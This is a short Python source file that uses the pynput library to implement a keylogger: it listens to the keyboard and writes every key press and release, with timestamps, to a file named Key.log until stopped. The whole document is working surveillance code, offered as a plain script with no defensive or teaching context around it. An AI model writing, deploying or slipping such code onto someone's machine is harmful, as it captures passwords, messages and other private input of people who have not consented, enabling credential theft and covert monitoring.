import logging

from pynput import keyboard


def logger():
    logging.basicConfig( filename=("Key.log"), filemode="w", format='%(asctime)s:%(message)s',
                         level=logging.DEBUG )

    def on_press(key):
        try:
            logging.warning( '--->  {0}'.format( key.char ) )
        except AttributeError:
            logging.warning( '-->  {0}'.format(
                    key ) )

    def on_release(key):
        logging.warning( '--->  {0} released'.format(
                key ) )

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release ) as listener:
        listener.join()
